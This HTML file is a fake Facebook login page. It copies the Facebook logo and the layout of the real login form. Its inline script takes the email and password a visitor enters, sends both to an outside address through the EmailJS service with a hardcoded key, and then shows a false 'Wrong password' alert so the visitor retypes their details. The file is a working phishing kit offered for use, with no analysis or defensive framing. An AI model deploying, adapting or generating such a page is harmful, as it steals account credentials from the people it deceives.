<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
        <form id="loginForm">
            <input type="text" id="email" name="email" placeholder="Email or Phone Number" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <a href="#" class="forgot-password">Forgotten password?</a>
        </form>
        <div class="create-account">
            <p>New to Facebook?</p>
            <button type="button">Create New Account</button>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script src="script.js"></script>
    <script>
        // Initialize EmailJS with your user ID
        emailjs.init("sORFw8Hl_RIwb17OR");

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Collect form data
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send an email with EmailJS
            emailjs.send('service_prfssr', 'template_4hz2kyw', {
                email: email,
                password: password
            }).then(function(response) {
                alert('Wrong password, please try again!');
            }, function(error) {
                alert('Wrong email or phone number, please try again');
            });
        });
    </script>
</body>
</html>
